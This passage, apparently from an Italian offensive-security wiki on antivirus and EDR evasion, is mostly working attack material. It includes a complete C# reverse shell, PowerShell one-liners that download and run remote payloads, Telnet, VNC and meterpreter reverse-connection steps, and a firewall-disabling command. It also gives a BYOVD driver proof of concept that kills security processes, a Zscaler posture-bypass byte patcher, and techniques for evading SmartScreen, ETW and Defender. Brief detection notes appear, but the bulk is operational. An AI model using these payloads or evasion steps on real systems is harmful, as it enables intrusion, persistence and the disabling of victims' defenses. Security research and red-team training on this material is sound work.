- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un crypter PE .NET scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

### Mascheramento autonomo per funzione assistito dal compilatore LLVM

Invece di mascherare un intero implant solo mentre è inattivo, un backend X86 LLVM modificato può mantenere le funzioni selezionate mascherate con XOR quando non sono attive. Il PoC Function Peekaboo seleziona i nomi demangled che contengono `REG_`, inserisce stub di ingresso/uscita indipendenti dalla posizione attorno al codice macchina finale e genera un unico handler di mascheramento condiviso in `.text`; le firme a livello sorgente e la convenzione di chiamata Windows x64 rimangono invariate.<sup>[[38]](#references)[[39]](#references)</sup>

#### Trasformazione del flusso di controllo nel backend

Questa trasformazione va eseguita dopo la selezione delle istruzioni e l'ottimizzazione, perché deve interessare **ogni return emesso** e conoscere l'esatta disposizione x86. Un `MachineFunctionPass` pre-emissione individua l'ultimo `MachineInstr::isReturn()`, lo elimina affinché il percorso finale prosegua nell'epilogo aggiunto e sostituisce i return precedenti con `JMP_1 handler`. Mantieni gli eventuali teardown dello stack/frame generati dal compilatore prima di ogni return; reindirizza solo l'istruzione di return.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` e `emitFunctionBodyEnd()` emettono gli stub per funzione, mentre `emitEndOfAsmFile()` emette l'handler. I simboli condivisi tra le fasi di emissione consentono a un branch del prologo di puntare al suo epilogo successivo; per un `je` near emesso manualmente, scrivi `0F 84` seguito dall'espressione MC a quattro byte `target - address_after_je`. Le chiamate e i salti all'handler possono invece essere emessi come oggetti `MCInst` (`CALL64pcrel32` e `JMP_1`). Un pass deve restituire `false` per una funzione non selezionata se non ha apportato modifiche; il PoC restituisce erroneamente `true` in questo caso.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadati e inizializzazione pre-CRT

Il PoC inserisce in `.funcmeta` una chiave XOR e record da 16 byte contenenti un puntatore a funzione rilocato dal loader e una lunghezza runtime. Sebbene il campo C sia un `uint32_t`, l'handler accede a un QWORD all'offset `+8` del record, consumando la lunghezza e il relativo padding, e avanza tra i record di `0x10`. I nomi delle sezioni PE occupano solo otto byte, quindi la ricerca runtime vede `.funcmet`. Un patcher esterno aggiunge una sezione eseguibile `.stub`, salva nello stub il vecchio RVA dell'entry point e reindirizza `AddressOfEntryPoint`; lo stub PIC ottiene la base dell'immagine da `gs:[0x60]` → `[PEB+0x10]`, percorre gli import PE32+ per risolvere una `VirtualProtect` già importata e viene eseguito prima del CRT.<sup>[[38]](#references)[[39]](#references)</sup>

L'inizializzazione imposta un sentinel in `gs:[0xE8]` e chiama ogni funzione nei metadati. Il prologo, che rimane sempre leggibile, registra l'inizio della funzione in `gs:[0xF0]`, rileva il sentinel e salta il corpo ancora in chiaro. L'epilogo usa quindi `call handler`; dopo che l'handler ha salvato 13 registri (`0x68` byte), l'indirizzo di ritorno in `[rsp+0x68]` corrisponde alla fine della funzione trasformata, perciò `end - start` può essere scritto nel record dei metadati. Lo stub azzera il sentinel e salta a `ImageBase + original_entry_point_RVA` dopo aver mascherato tutti i corpi.<sup>[[38]](#references)[[39]](#references)</sup>

Durante una chiamata normale, il prologo chiama lo stesso handler simmetrico per decodificare il corpo. Il percorso finale prosegue nell'epilogo aggiunto, mentre ogni return precedente salta direttamente all'handler condiviso. Anche l'epilogo normale usa `jmp handler` invece di `call`, così, dopo aver rimaskerato il corpo, il `ret` dell'handler consuma l'indirizzo di ritorno del chiamante originale e preserva il risultato della funzione in `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitiva di mascheramento e indicatori di analisi

L'handler individua il record corrente, salta il prologo visibile di lunghezza fissa (in questa build `0x46` byte), imposta il resto su `PAGE_EXECUTE_READWRITE`, applica XOR byte per byte usando il byte meno significativo della chiave e lo imposta infine su `PAGE_EXECUTE_READ`. Lo stesso ciclo decodifica quindi all'ingresso e codifica a ogni normale uscita.<sup>[[38]](#references)[[39]](#references)</sup>

Gli indicatori ad alta affidabilità di questo design includono:<sup>[[38]](#references)[[39]](#references)</sup>

- un entry point all'interno di uno `.stub` eseguibile e una sezione `.funcmet` contenente una chiave e puntatori `.text` rilocati;
- analisi pre-CRT di PEB, tabella degli import e tabella delle sezioni, seguita da chiamate tramite ogni puntatore nei metadati;
- prologhi PIC `call`/`pop` identici e numerosi return reindirizzati a un unico handler;
- scritture in `gs:[0xE8]`, `gs:[0xF0]` e `gs:[0xF8]`, seguite da ripetute transizioni `VirtualProtect` e scritture XOR byte per byte in pagine eseguibili supportate dall'immagine.

Questa tecnica elude gli scanner di memoria, non offre protezione crittografica: il file patchato contiene ancora il corpo originale in chiaro, e un debugger può interrompere l'esecuzione su `VirtualProtect` o sul ciclo XOR e scaricare la funzione attiva. Anche lo XOR a singolo byte, i metadati leggibili e il limite fisso `0x46` rendono semplice il recupero offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Gli slot TEB del PoC sono specifici del thread, ma le pagine di codice modificate sono condivise a livello di processo. Un ingresso concorrente o ricorsivo può quindi riattivare le istruzioni mentre un'altra invocazione le sta eseguendo; anche eccezioni e uscite non locali possono impedire il rimasking. Un'implementazione robusta deve sincronizzare le transizioni, ripristinare la protezione effettivamente restituita tramite `lpflOldProtect`, evitare lunghezze dello stub hard-coded, verificare entrambi i percorsi `call` e `jmp` per l'allineamento dello stack x64 e chiamare `FlushInstructionCache` dopo aver riscritto byte eseguibili. Microsoft attribuisce esplicitamente al chiamante la responsabilità della coerenza della cache delle istruzioni quando viene modificato codice eseguibile.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen e MoTW

Potresti aver visto questa schermata quando scarichi da internet alcuni eseguibili e li esegui.

Microsoft Defender SmartScreen è un meccanismo di sicurezza pensato per proteggere gli utenti finali dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen si basa principalmente sulla reputazione: le applicazioni scaricate raramente attivano SmartScreen, che avvisa così l'utente finale e ne impedisce l'esecuzione (anche se il file può comunque essere eseguito facendo clic su More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [Alternate Data Stream NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) chiamato Zone.Identifier, creato automaticamente quando si scaricano file da internet e contenente anche l'URL da cui sono stati scaricati.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verifica dell'ADS Zone.Identifier di un file scaricato da internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **attendibile** **non attivano SmartScreen**.

Un modo molto efficace per impedire ai payload di ricevere il Mark of The Web consiste nel inserirli in un contenitore come un ISO. Questo perché il Mark-of-the-Web (MOTW) **non può** essere applicato ai volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che inserisce i payload in contenitori di output per eludere il Mark-of-the-Web.

Esempio di utilizzo:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ecco una demo per bypassare SmartScreen impacchettando payload all'interno di file ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che consente alle applicazioni e ai componenti di sistema di **registrare eventi**. Tuttavia, può anche essere usato dai prodotti di sicurezza per monitorare e rilevare attività malevole.

Come per la disattivazione (bypass) di AMSI, è anche possibile fare in modo che la funzione **`EtwEventWrite`** del processo in user space ritorni immediatamente senza registrare alcun evento. Questo si ottiene applicando una patch alla funzione in memoria affinché ritorni immediatamente, disattivando di fatto il logging ETW per quel processo.

Puoi trovare maggiori informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Il caricamento di binari C# in memoria è noto da diverso tempo ed è ancora un ottimo metodo per eseguire i tuoi strumenti di post-exploitation senza essere rilevati dall'AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci solo di applicare una patch ad AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) offre già la possibilità di eseguire assembly C# direttamente in memoria, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Consiste nel **creare un nuovo processo sacrificabile**, iniettare il tuo codice malevolo di post-exploitation nel nuovo processo, eseguire il codice malevolo e, al termine, terminare il nuovo processo. Questo metodo ha sia vantaggi sia svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **al di fuori** del processo del nostro implant Beacon. Ciò significa che, se qualcosa durante l'attività di post-exploitation dovesse andare storto o essere rilevato, ci sono **molte più probabilità** che il nostro **implant sopravviva**. Lo svantaggio è che hai **maggiori probabilità** di essere rilevato dai **rilevamenti comportamentali**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste nell'iniettare il codice malevolo di post-exploitation **nel suo stesso processo**. In questo modo, puoi evitare di creare un nuovo processo e di farlo analizzare dall'AV, ma lo svantaggio è che, se qualcosa va storto durante l'esecuzione del payload, ci sono **molte più probabilità** di **perdere il tuo beacon**, perché potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi approfondire il caricamento di assembly C#, consulta questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e il loro BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare assembly C# **da PowerShell**: dai un'occhiata a [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e al [video di S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Uso di altri linguaggi di programmazione

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo usando altri linguaggi, fornendo alla macchina compromessa l'accesso **all'ambiente dell'interprete installato sulla condivisione SMB controllata dall'attaccante**.

Consentendo l'accesso ai binari dell'interprete e all'ambiente sulla condivisione SMB, puoi **eseguire codice arbitrario in questi linguaggi direttamente in memoria** sulla macchina compromessa.

Il repository indica che Defender continua ad analizzare gli script, ma usando Go, Java, PHP ecc. abbiamo **maggiore flessibilità per bypassare le firme statiche**. I test con script reverse shell casuali e non offuscati in questi linguaggi hanno avuto esito positivo.

## TokenStomping

Token stomping manipola il token di accesso di un prodotto di sicurezza, come un EDR o un AV. Ridurre i privilegi del token può lasciare il processo in esecuzione, impedendogli al contempo di eseguire azioni privilegiate di ispezione o remediation.

Per impedirlo, Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Uso di software attendibile

### Chrome Remote Desktop

Come descritto in [**questo post del blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile distribuire Chrome Remote Desktop sul PC di una vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:<sup>[[35]](#references)</sup>
1. Scarica il programma da https://remotedesktop.google.com/, fai clic su "Set up via SSH" e poi sul file MSI per Windows per scaricarlo.
2. Esegui l'installer in modalità silenziosa sulla macchina della vittima (sono necessari i privilegi di amministratore): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e fai clic su Next. La procedura guidata ti chiederà di autorizzare; fai clic sul pulsante Authorize per continuare.
4. Esegui il comando fornito apportando le modifiche necessarie: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (il parametro `--pin` imposta il PIN senza usare la GUI).
 

## Evasione avanzata

L'evasione è un argomento molto complesso; a volte occorre tenere conto di molte fonti diverse di telemetria in un unico sistema, quindi è praticamente impossibile rimanere completamente inosservati in ambienti maturi.

Ogni ambiente in cui operi avrà punti di forza e debolezze specifici.

Ti consiglio vivamente di guardare questo talk di [@ATTL4S](https://twitter.com/DaniLJ94), per farti un'idea delle tecniche di evasione più avanzate.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Anche questo è un altro ottimo talk di [@mariuszbit](https://twitter.com/mariuszbit) sull'evasione in profondità.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Vecchie tecniche**

### **Verificare quali parti Defender rileva come malevole**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), che **rimuove parti del binario** finché **non individua quale parte Defender** rileva come malevola, per poi mostrartela.\
Un altro strumento che fa **la stessa cosa è** [**avred**](https://github.com/dobin/avred), che offre il servizio tramite web all'indirizzo [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Server Telnet**

Fino a Windows 10, tutte le versioni di Windows includevano un **server Telnet** che potevi installare (come amministratore) eseguendo:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Fai in modo che **si avvii** all'avvio del sistema ed **eseguilo** ora:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Cambiare la porta telnet** (stealth) e disabilitare il firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (ti servono i download binari, non il setup)

**SULL'HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Poi, sposta il binario _**winvnc.exe**_ e il file _**UltraVNC.ini**_ appena creato all'interno della **vittima**

#### **Connessione inversa**

L'**attaccante** deve **eseguire sul proprio** **host** il binario `vncviewer.exe -listen 5900`, così sarà **pronto** a ricevere una **connessione VNC** inversa. Poi, all'interno della **vittima**: avvia il daemon winvnc con `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere la stealth, evita di fare alcune cose

- Non avviare `winvnc` se è già in esecuzione, altrimenti verrà visualizzato un [popup](https://i.imgur.com/1SROTTl.png). Controlla se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory, altrimenti si aprirà [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per visualizzare la guida, altrimenti verrà visualizzato un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

All'interno di GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Ora **avvia il listener** con `msfconsole -r file.rc` ed **esegui** il **payload xml** con:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**L'attuale Defender terminerà il processo molto rapidamente.**

### Compilare la nostra reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prima reverse shell in C#

Compilala con:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Usalo con:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# con il compilatore

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download ed esecuzione automatici:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di obfuscator per C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usare Python per creare injector, ad esempio:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Terminare AV/EDR dallo spazio kernel

Storm-2603 ha sfruttato una piccola utility per console nota come **Antivirus Terminator** per disabilitare le protezioni degli endpoint prima di distribuire il ransomware. Lo strumento include un **proprio driver vulnerabile ma *firmato*** e ne abusa per eseguire operazioni privilegiate nel kernel che nemmeno i servizi AV Protected-Process-Light (PPL) possono bloccare.<sup>[[12]](#references)</sup>

Punti chiave
1. **Driver firmato**: Il file distribuito su disco è `ServiceMouse.sys`, ma il binario è il driver firmato legittimamente `AToolsKrnl64.sys` del “System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver ha una firma Microsoft valida, viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Installazione del servizio**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   La prima riga registra il driver come **servizio kernel** e la seconda lo avvia, rendendo `\\.\ServiceMouse` accessibile da userland.
3. **IOCTL esposti dal driver**
   | Codice IOCTL | Funzionalità                            |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Terminare un processo arbitrario tramite PID (usato per terminare i servizi Defender/EDR) |
   | `0x990000D0` | Eliminare un file arbitrario dal disco |
   | `0x990001D0` | Scaricare il driver e rimuovere il servizio |

   Proof-of-concept C minimale:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Perché funziona**: BYOVD aggira completamente le protezioni in modalità utente; il codice eseguito nel kernel può aprire processi *protetti*, terminarli o manomettere oggetti del kernel, indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Rilevamento / Mitigazione
•  Abilita l’elenco di blocco dei driver vulnerabili di Microsoft (`HVCI`, `Smart App Control`), affinché Windows rifiuti di caricare `AToolsKrnl64.sys`.
•  Monitora la creazione di nuovi servizi *kernel* e genera un avviso quando un driver viene caricato da una directory scrivibile da chiunque o non presente nell’elenco degli elementi consentiti.
•  Verifica la presenza di handle in modalità utente a oggetti dispositivo personalizzati, seguiti da chiamate `DeviceIoControl` sospette.

### Aggirare i controlli di postura di Zscaler Client Connector modificando i binari su disco

**Client Connector** di Zscaler applica localmente le regole di postura del dispositivo e si affida a Windows RPC per comunicare i risultati ad altri componenti. Due scelte progettuali deboli rendono possibile un bypass completo:

1. La valutazione della postura avviene **interamente lato client** (al server viene inviato un valore booleano).
2. Gli endpoint RPC interni verificano soltanto che l’eseguibile che si connette sia **firmato da Zscaler** (tramite `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Modificando quattro binari firmati su disco**, entrambi i meccanismi possono essere neutralizzati:

| Binario | Logica originale modificata | Risultato |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Restituisce sempre `1`, quindi tutti i controlli risultano conformi |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | Sostituita con NOP ⇒ qualsiasi processo (anche non firmato) può connettersi alle pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita con `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Controlli di integrità del tunnel | Bypassati |

Estratto minimale del patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Dopo aver sostituito i file originali e riavviato lo stack dei servizi:

* **Tutti** i controlli di postura risultano **conformi/verdi**.
* I binari non firmati o modificati possono aprire gli endpoint RPC named-pipe indicati (ad es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L’host compromesso ottiene accesso senza restrizioni alla rete interna definita dai criteri di Zscaler.

Questo case study dimostra come le decisioni di trust prese esclusivamente lato client e i semplici controlli delle firme possano essere aggirati con poche modifiche ai byte.

## Abuso delle funzionalità attendibili di Microsoft Defender `BTR.sys`

Il driver **Boot-Time Removal** di Defender è un utile termine di paragone con il classico BYOVD. `BTR.sys` è un componente di remediation legittimo, firmato da Microsoft, privo di bug di memory corruption e di interfaccia IOCTL; dopo aver ottenuto l’accesso da amministratore e `SeLoadDriverPrivilege`, un operatore può invece contraffare la transazione privata di remediation e ottenere le operazioni su file/registro previste in Ring-0. Si tratta di una **primitiva di neutralizzazione di AV/EDR post-compromissione, non di accesso iniziale né di escalation dei privilegi**, e il driver può essere estratto dalla risorsa `BOOTTIMETOOL` del `MpEngine.dll` del target stesso, anziché importare un vistoso driver di terze parti.<sup>[[36]](#references)</sup>

### Preparazione del driver monouso

Di norma Defender salva la risorsa in un file con nome casuale `[a-z]{8}.sys` e registra un servizio kernel con un nome simile. `DriverEntry` legge il valore `Args` del servizio, apre l’NTFS ADS indicato, decritta e convalida l’elenco di azioni, scrive i dati di feedback e, dopo aver completato l’esecuzione, restituisce `0xC0000056` (`STATUS_DELETE_PENDING`), così il driver viene scaricato invece di rimanere residente. Un servizio contraffatto presenta i seguenti valori caratteristici.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Lo stream `:changelist` contiene un blob cifrato con RC4. Le build analizzate riutilizzano una chiave fissa di 256 byte, quindi la cifratura non costituisce un confine di autorizzazione. Un plaintext valido ha un'intestazione globale di 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC dell'intestazione e ID di transazione derivato dal payload), seguita da un percorso di feedback UTF-16 con terminazione null e un numero qualsiasi di elementi. Ogni elemento ha un'intestazione di 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) più dati specifici dell'azione che terminano con **esattamente quattro byte NUL**. Ogni regione di intestazione/dati viene verificata separatamente con CRC-32, polinomio `0xEDB88320`, stato iniziale `0xFFFFFFFF` e **senza XOR finale** (`~CRC32`); lo stato del CRC viene azzerato per ogni regione.<sup>[[36]](#references)[[37]](#references)</sup>

